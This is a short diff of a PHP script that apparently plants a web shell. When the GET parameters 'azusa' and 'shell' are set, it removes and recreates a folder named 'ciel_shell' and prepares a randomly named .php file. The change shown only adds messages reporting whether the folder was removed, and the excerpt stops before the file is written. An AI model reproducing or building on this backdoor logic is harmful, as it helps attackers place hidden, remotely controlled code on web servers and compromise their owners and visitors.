@@ -63,10 +63,14 @@ if (isset($_GET['azusa'])) {
     if (isset($_GET['shell'])) {
         $folderName = 'ciel_shell';
         $randomFileName = generateRandom(5) . ".php";
-        // Check if the folder exists
+        // Check if the folder exists then remove the folder if exists
         if (file_exists($folderName)) {
             // remove folder
-            rmdir($folderName);
+            if (rmdir($folderName)) {
+                echo "Success remove folder $folderName<br>";
+            } else {
+                echo "Failed remove folder $folderName<br>";
+            }
         }
         // create folder
         if (mkdir($folderName)) {
